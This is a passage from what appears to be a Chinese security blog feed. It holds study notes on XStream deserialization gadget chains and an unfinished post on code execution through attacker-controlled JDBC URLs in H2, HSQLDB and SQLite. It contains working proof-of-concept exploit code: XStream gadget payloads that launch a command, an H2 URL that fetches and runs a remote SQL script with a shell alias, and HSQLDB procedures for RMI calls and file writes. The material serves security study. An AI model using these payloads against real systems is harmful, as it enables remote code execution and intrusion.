    <content type="html"><![CDATA[<p>XStream 反序列化问题由来已久，从&lt;=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。</p><p>本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。</p><h2 id="1-XStream-原理解析"><a href="#1-XStream-原理解析" class="headerlink" title="1. XStream 原理解析"></a>1. XStream 原理解析</h2><h3 id="1-1-源码解析"><a href="#1-1-源码解析" class="headerlink" title="1.1 源码解析"></a>1.1 源码解析</h3><p>参考【3】<br><img src="/images/pasted-136.png" alt="upload successful"></p><a id="more"></a><h4 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h4><p>Mapper的作用类似alias，即将实际的class与xml元素名称对应起来。例如</p><ul><li>sorted-set对应java.util.SortedSet</li></ul><h5 id="XStream-mapper"><a href="#XStream-mapper" class="headerlink" title="XStream.mapper"></a>XStream.mapper</h5><p>是在<code>XStream.buildMapper()</code>中进行初始化</p><p>通过<code>Class type = HierarchicalStreams.readClassType(reader, mapper)</code>进行调用。</p><h4 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h4><p>Converter字面意义为转换器，负责对每个Java Object进行转换，比如有<code>IntConverter</code>、<code>CharConverter</code>、<code>TreeSetConverter</code>等等</p><h5 id="xstream-converterLookup"><a href="#xstream-converterLookup" class="headerlink" title="xstream.converterLookup"></a>xstream.converterLookup</h5><p>在<code>XStream.setupConverters()</code>中进行初始化</p><p>通过以下方式进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 获取type 类型，type为class，eg java.util.SortdSet</span><br><span class="line">Converter converter = converterLookup.lookupConverterForType(type);</span><br><span class="line"># converter 值为TreeSetConverter</span><br><span class="line">convert(parent, type, converter);</span><br></pre></td></tr></table></figure><h3 id="1-2-SerializableConverter"><a href="#1-2-SerializableConverter" class="headerlink" title="1.2 SerializableConverter"></a>1.2 SerializableConverter</h3><p>简单来讲，如果class 实现了Serializable，那么对应的Converter为SerializableConverter，如果没有，那么就是其他的Converter，依前文<code>lookupConverterForType(type)</code>中的type而定。</p><p>参考【2】中有着一部分的代码及调试，不赘述</p><h3 id="1-3-CustomObjectInputStream"><a href="#1-3-CustomObjectInputStream" class="headerlink" title="1.3 CustomObjectInputStream"></a>1.3 CustomObjectInputStream</h3><p>都知道反序列化是通过 <code>ObjectInputStream.readObject()</code>实现Input转Object的。针对实现了Serializable接口的类，XStream也是通过调用readObject进行转化的，但是Input是xml格式的，如何做到的呢？</p><p><code>ObjectInputStream.readObject()</code>的实现流程如下：<br><img src="/images/pasted-135.png" alt="upload successful"></p><p>可以看到Input会被解析成一个个类似TC_OBJECT的数据结构，Xstream 大致来说是通过CustomObjectInputStream实现这种解析xml结构的。</p><p>需要注意的是CustomObjectInputStream.StreamCallback 接口，在ExternalizableConverter和SerializableConverter 有不同的实现，以SerializableConverter为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CustomObjectInputStream.StreamCallback callback = <span class="keyword">new</span> CustomObjectInputStream.StreamCallback() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readFromStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      reader.moveDown();</span><br><span class="line">      Class type = HierarchicalStreams.readClassType(reader, SerializableConverter.<span class="keyword">this</span>.mapper);</span><br><span class="line">      Object value = context.convertAnother(result, type);</span><br><span class="line">      reader.moveUp();</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-反序列化利用"><a href="#2-反序列化利用" class="headerlink" title="2. 反序列化利用"></a>2. 反序列化利用</h2><p>引用Wh1t3p1g师傅的解释</p><blockquote><p>XStream反序列化同fastjson这种不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都由Java的反射机制来完成，所以并没有这样主动调用的特性。</p></blockquote><blockquote><p>但是还有一种利用方式，回想一下，在几条常规的java反序列化利用链上，都利用了HashMap、PriorityQueue等对象（key不可重复等特性）会自动去调用hashCode、equal、compareTo等这种函数。</p></blockquote><p>讲的很明白了，强调一点：<strong>java反序列化利用链，类必须要可Serializable，但是在Xstream上，并不是必须</strong>，这里是一切利用链的根本原因。</p><ol><li>原Java反序列化链当然可以用</li><li>寻找新的HashMap、PriorityQueue</li></ol><h3 id="2-1-原Java反序列化链"><a href="#2-1-原Java反序列化链" class="headerlink" title="2.1 原Java反序列化链"></a>2.1 原Java反序列化链</h3><p>这里贴一下基于cc7的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Object calc = <span class="keyword">new</span> CommonsCollections7().getObject(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        String xml = xStream.toXML(calc);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        Object cc7 = xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-寻找新的HashMap、PriorityQueue等"><a href="#2-2-寻找新的HashMap、PriorityQueue等" class="headerlink" title="2.2 寻找新的HashMap、PriorityQueue等"></a>2.2 寻找新的HashMap、PriorityQueue等</h3><p>Wh1t3p1g师傅文章中解释了这三个特殊的类</p><ol><li>MapConverter，会调用hashCode</li><li>TreeSet/TreeMapConverter，会调用compareTo</li><li>DynamicProxyConverter，创建了Proxy instance，InvocationHandler可控</li></ol><p>师傅已经讲的很明白了，这里也不多讲，简单解释</p><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><h5 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h5><p>这里涉及到java动态代理知识，用到的是TreeSetConverter+DynamicProxyConverter，poc原文有，就不贴了，简单解释下逻辑如下:</p><ul><li><p>TreeSetConverter 当新插入一个key，会运行key的compareTo方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure></li><li><p>DynamicProxyConverter 实现生成代理类实例，重点是其中的handler可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy = Proxy.newProxyInstance(classLoaderReference.getReference(), interfacesAsArray, handler);</span><br></pre></td></tr></table></figure></li><li><p>EventHandler 就是这样理想的可控InvocationHandler。EventHandler 有属性target&amp;action，其中target为object，action为method，EventHandler 的invoke实现上的逻辑最终会执行action.invoke(target,args)，其中target Demo为ProcessBuilder对象，action为start方法，最终实现RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 伪代码</span><br><span class="line"># proxy.compareTo()</span><br><span class="line"># EventHandler 被代理类会执行 invoke(proxy,&quot;compareTo&quot;,arguments)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span></span><br></pre></td></tr></table></figure></li></ul><p>其实理解了这个的逻辑，下面的几个都比较类似了</p><p>可以看出来，这个利用链的重点是EventHandler</p><h5 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h5><p>Groovy ConvertedClosure 这个链其实和ysoserial 的Groovy1链类似，只不过Handler有点不一样。详细分析可以看看Groovy链的分析，师傅文章里有链接，blog里面也有这个链的简单分析。</p><h6 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h6><p>Wh1t3p1g师傅提到的是这个姿势实现RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure><p>实际上，这样也可以触发（但是不带参数，暂时没找到可以无参数的后续利用链）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call()</span><br></pre></td></tr></table></figure><p>Groovy1链用的就是这种，恰好是无参数的触发。</p><h6 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    ConvertedClosure handler = <span class="keyword">new</span> ConvertedClosure((Closure) mc, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line">    Object map = Proxy.newProxyInstance(</span><br><span class="line">            GroovyConvertedClosure.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparable.class&#125;, handler);</span><br><span class="line">    TreeSet ts = PayloadHelper.makeTreeSet(<span class="string">&quot;open -a calculator.app&quot;</span>, map);</span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(ts);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    </span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h5><blockquote><p>前面用到了TreeSet的方式，这里我们去使用Map的类型来触发。以Map的类型来触发，那就是找可以利用的hashCode函数</p></blockquote><blockquote><p>groovy.util.Expando#hashCode</p></blockquote><p>师傅的思路是从寻找hashCode，往上回溯</p><ol><li>groovy.util.Expando#hashCode 执行了closure.call()，其中closure来源为属性expandoProperties</li><li>TreemapConverter 每次插入obj的时候，都会执行obj.hashCode</li></ol><p>思路很简单，poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">    Expando exp = <span class="keyword">new</span> Expando();</span><br><span class="line">    exp.setProperty(<span class="string">&quot;hashCode&quot;</span>,mc);</span><br><span class="line"></span><br><span class="line">    HashMap tp = PayloadHelper.makeMap(<span class="string">&quot;foo&quot;</span>,exp);</span><br><span class="line"></span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(tp);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中用到的是MapConveter。</p><h5 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. ImageIO$ContainsFilter</h5><p>这个链比较长，思路来源是marshalsec的ImageIO gadget，逆向发现的确很难，Wh1t3p1g师傅也是从正向去跟踪的。</p><p>正向的复现师傅文章里也很详细了，不赘述了。</p><h5 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h5><p>这个链的思路最早【4】中orich1师傅的发现，过程也比较长，重点是从BCEL触发，寻找可用的lass.ForName()利用点，Iterator.next这里开始逆向发现新的链。Wh1t3p1g师傅的实现BCEL也很有亮点，很值得学习。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节简要介绍了XStream的序列化&amp;反序列化的实现原理。java反序列化，类必须要可Serializable，但是在XStream上，并不是必须。针对非Seriablzable的类，XStream引入了多种Conveter实现这一过程。</p><p>其中EventHandler 和Groovy ConvertedClosure 都是利用到了TreeSetConveter &amp; DynamicProxyConverter，Groovy Expando利用到了MapConverter。</p><p>遗留问题：</p><ol><li>gadget 4和5还需要再单独分析分析，Wh1t3p1g师傅的ysomap还有几个gadget，也需要再单独学习学习姿势。</li><li>BCEL 这种通用的利用手法思路，有没有其他的APP。</li><li>XStream 后续的几个CVE</li><li>XStream 的黑名单安全手段，SecurityConveter</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">回顾XStream反序列化漏洞</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li><li>[3] <a href="https://www.jianshu.com/p/387c568faf62">XStream 源码解析</a></li><li>[4] <a href="https://www.anquanke.com/post/id/172198">jenkins 2.101 XStream rce 挖掘思路</a></li><li>[5] <a href="https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/">Jenkins 2.101 XStream Rce[空指针CTF一月内部赛Writeup]</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;XStream 反序列化问题由来已久，从&amp;lt;=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。&lt;/p&gt;
&lt;p&gt;本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。&lt;/p&gt;
&lt;h2 id=&quot;1-XStream-原理解析&quot;&gt;&lt;a href=&quot;#1-XStream-原理解析&quot; class=&quot;headerlink&quot; title=&quot;1. XStream 原理解析&quot;&gt;&lt;/a&gt;1. XStream 原理解析&lt;/h2&gt;&lt;h3 id=&quot;1-1-源码解析&quot;&gt;&lt;a href=&quot;#1-1-源码解析&quot; class=&quot;headerlink&quot; title=&quot;1.1 源码解析&quot;&gt;&lt;/a&gt;1.1 源码解析&lt;/h3&gt;&lt;p&gt;参考【3】&lt;br&gt;&lt;img src=&quot;/images/pasted-136.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc碎碎念三：内存数据库</title>
    <link href="http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2021-04-26T06:10:00.000Z</published>
    <updated>2021-11-25T05:58:45.255Z</updated>
    
    <content type="html"><![CDATA[<p>继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？</p><ol><li>攻击client思路，典型的就是mysql client，前面讲过</li><li>攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势</li></ol><h1 id="攻击内存数据库Server"><a href="#攻击内存数据库Server" class="headerlink" title="攻击内存数据库Server"></a>攻击内存数据库Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>h2_exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;open -a calculator.app&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>python -m SimpleHTTPServer 3333</code></p><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:3333/h2_exec.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection con = DriverManager.getConnection(url);</span><br><span class="line">&#125;<span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-133.png" alt="upload successful"></p><p>tips: <code>java -cp h2.jar org.h2.tools.Server</code>可以开启web console server</p><h2 id="HSQLDB"><a href="#HSQLDB" class="headerlink" title="HSQLDB"></a>HSQLDB</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hsqldb HTTP Server</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.server.WebServer --database.0 file:mydb --dbname.0 xdb</span><br><span class="line"><span class="comment"># 连接</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.util.DatabaseManagerSwing</span><br></pre></td></tr></table></figure><p>浅蓝大佬关于HSQLDB的总结算是见到最全面的相关文章了，详情参考【5】，这里直接给出方法&amp;结论</p><h3 id="1-利用call-java-static-function"><a href="#1-利用call-java-static-function" class="headerlink" title="1. 利用call java static function"></a>1. 利用call java static function</h3><p>利用hsqldb create function/procedure可直接调用Java静态方法，例如</p><ul><li>rmi 利用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rce(<span class="built_in">VARCHAR</span>(<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">returns</span> <span class="built_in">VARCHAR</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">no</span> <span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">language</span> <span class="keyword">java</span></span><br><span class="line">    <span class="keyword">external</span> <span class="keyword">name</span> <span class="string">&#x27;CLASSPATH:java.rmi.Naming.list&#x27;</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">CALL</span> rce(<span class="string">&#x27;rmi://127.0.0.1:2333/a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li>写文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> writeBytesToFilename(<span class="keyword">IN</span> paramString <span class="built_in">VARCHAR</span>(<span class="number">1024</span>), <span class="keyword">IN</span> paramArrayOfByte VARBINARY(<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">JAVA</span></span><br><span class="line"><span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> <span class="string">&#x27;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;</span><br><span class="line"><span class="keyword">call</span> writeBytesToFilename(<span class="string">&#x27;/tmp/hsql111&#x27;</span>, <span class="keyword">cast</span> (<span class="string">&#x27;313131313131&#x27;</span> <span class="keyword">AS</span> VARBINARY(<span class="number">1024</span>)));</span><br></pre></td></tr></table></figure></li></ul><p>但是利用条件比较苛刻，需要</p><ol><li>可控jdbc URL</li><li>可自定义执行sql，去call java静态方法</li></ol><h3 id="2-利用反序列化"><a href="#2-利用反序列化" class="headerlink" title="2. 利用反序列化"></a>2. 利用反序列化</h3><p>赞一个浅蓝大佬的文章参考【5】，hsql研究文章挺少的，浅蓝大佬总结很到位。<br>触发点有两个</p><ol><li>JDBCResultSet，获取sql运行结果的时候，getObject触发</li><li>JDBCCallableStatement，预编译阶段，指定OTHER类型参数时可以触发</li></ol><p>浅蓝用到的demo是2，1的demo如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">String dburl = <span class="string">&quot;jdbc:hsqldb:http://127.0.0.1/xdb&quot;</span>;</span><br><span class="line">Connection connection = DriverManager.getConnection(dburl, <span class="string">&quot;sa&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">Statement stmt = connection.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;SELECT * FROM \&quot;PUBLIC\&quot;.\&quot;MOVIES\&quot;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>可以进一步自动化成类似mysql fake server，攻击client，不过触发也是很鸡肋了</p><ol><li>可控jdbc URL</li><li>需要client execteQuery并且 getObject</li></ol><p>顺带提到下参考【7】中的CVE-2020-5902 F5 big-ip的这个漏洞，调试比较有意思的，还有宽字节遇到的这个case，参考【8】</p><h2 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.13.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ldap 和call 应该会有问题<br>To Be Continued…</p><h2 id="SQlite"><a href="#SQlite" class="headerlink" title="SQlite"></a>SQlite</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.16.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2021/11/25新增<br>结合pyn3rd的hitb 的PPT，URL可控且SQL可控情况下，可以实现RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadExtension</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:http://127.0.0.1:8888/poc2.db?enable_load_extension=true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connection.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    Statement statement = 